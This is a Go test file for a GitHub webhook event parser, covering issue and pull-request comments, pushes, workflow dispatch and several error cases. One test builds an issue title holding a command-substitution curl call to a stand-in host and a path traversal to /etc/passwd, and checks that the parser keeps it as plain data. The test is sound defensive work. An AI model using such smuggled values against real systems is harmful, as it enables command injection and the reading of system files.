package github

import (
	"strings"
	"testing"
)

const testHeadSHA = "0123456789abcdef0123456789abcdef01234567"

func TestParseEventNewKindsAndFailures(t *testing.T) {
	t.Parallel()
	issueComment := []byte(`{
	  "action":"created",
	  "repository":{"full_name":"example/widgets"},
	  "issue":{"number":7,"title":"printer smoke","html_url":"https://github.example/example/widgets/issues/7"},
	  "comment":{"id":1001,"body":"@lark-agent why is this failing","user":{"login":"example-user","type":"User"}}
	}`)
	snap, err := ParseEvent("issue_comment", issueComment)
	if err != nil {
		t.Fatal(err)
	}
	if snap.Reference.Kind != ReferenceIssue || snap.Reference.IssueNumber != 7 || snap.Reference.CommentID != 1001 {
		t.Fatalf("issue comment ref=%+v", snap.Reference)
	}

	prComment := []byte(`{
	  "action":"created",
	  "repository":{"full_name":"example/widgets"},
	  "issue":{
	    "number":12,
	    "title":"gate",
	    "html_url":"https://github.example/example/widgets/issues/12",
	    "pull_request":{"html_url":"https://github.example/example/widgets/pull/12"}
	  },
	  "comment":{"id":1002,"body":"@lark-agent /review"}
	}`)
	snap, err = ParseEvent("issue_comment", prComment)
	if err != nil {
		t.Fatal(err)
	}
	if snap.Reference.Kind != ReferencePullRequest || snap.Reference.PullRequestNumber != 12 {
		t.Fatalf("SC-55 ref=%+v", snap.Reference)
	}

	review := []byte(`{
	  "action":"created",
	  "repository":{"full_name":"example/widgets"},
	  "pull_request":{
	    "number":12,
	    "html_url":"https://github.example/example/widgets/pull/12",
	    "head":{"sha":"` + testHeadSHA + `"}
	  },
	  "comment":{"id":2002,"body":"@lark-agent /review focus on auth"}
	}`)
	snap, err = ParseEvent("pull_request_review_comment", review)
	if err != nil {
		t.Fatal(err)
	}
	if snap.Reference.CommentID != 2002 || snap.Reference.HeadSHA != testHeadSHA {
		t.Fatalf("SC-73 ref=%+v", snap.Reference)
	}

	push := []byte(`{
	  "ref":"refs/heads/master",
	  "before":"0000000000000000000000000000000000000000",
	  "after":"` + testHeadSHA + `",
	  "repository":{"full_name":"example/widgets"},
	  "head_commit":{"id":"` + testHeadSHA + `"}
	}`)
	snap, err = ParseEvent("push", push)
	if err != nil {
		t.Fatal(err)
	}
	if snap.Reference.BeforeSHA != "0000000000000000000000000000000000000000" || snap.Reference.Kind != ReferencePush {
		t.Fatalf("SC-57 ref=%+v", snap.Reference)
	}

	hostileTitle := "$(curl http://example.invalid); ../../etc/passwd"
	hostile, err := ParseEvent("issues", []byte(`{
	  "action":"opened",
	  "repository":{"full_name":"example/widgets"},
	  "issue":{
	    "number":7,
	    "title":"`+hostileTitle+`",
	    "html_url":"https://github.example/example/widgets/issues/7"
	  },
	  "sender":{"login":"ignored"}
	}`))
	if err != nil {
		t.Fatal(err)
	}
	if hostile.Title != hostileTitle {
		t.Fatalf("SC-48 title=%q", hostile.Title)
	}

	if _, err := ParseEvent("workflow_run", []byte(`{
	  "repository":{"full_name":"example/widgets"},
	  "workflow_run":{"name":"verify","head_sha":"`+testHeadSHA+`","html_url":"https://github.example/run/1"}
	}`)); err == nil {
		t.Fatal("SC-29 expected missing workflow_run.id to fail")
	}
	if _, err := ParseEvent("check_suite", []byte(`{"repository":{"full_name":"example/widgets"}}`)); err == nil ||
		!strings.Contains(err.Error(), "unsupported github event") {
		t.Fatalf("SC-71 err=%v", err)
	}

	dispatch := []byte(`{"inputs":{"pr_number":"12"},"repository":{"full_name":"example/widgets"}}`)
	snap, err = ParseEvent("workflow_dispatch", dispatch)
	if err != nil {
		t.Fatal(err)
	}
	if snap.Reference.PullRequestNumber != 12 {
		t.Fatalf("SC-56 ref=%+v", snap.Reference)
	}

	if _, err := ParseEvent("fork", []byte(`{"repository":{"full_name":"example/widgets"}}`)); err == nil ||
		!strings.Contains(err.Error(), "unsupported github event") {
		t.Fatalf("SC-02 err=%v", err)
	}
	if _, err := ParseEvent("push", []byte(`{"ref":"refs/heads/master","after":"`+testHeadSHA+`"}`)); err == nil ||
		!strings.Contains(err.Error(), "invalid") {
		t.Fatalf("SC-30 err=%v", err)
	}
	if _, err := ParseEvent("issue_comment", []byte(`{
	  "repository":{"full_name":"example/widgets"},
	  "issue":{"number":7,"html_url":"https://github.example/example/widgets/issues/7"},
	  "comment":{"body":"@lark-agent hi"}
	}`)); err == nil || !strings.Contains(err.Error(), "comment id") {
		t.Fatalf("SC-72 err=%v", err)
	}
}
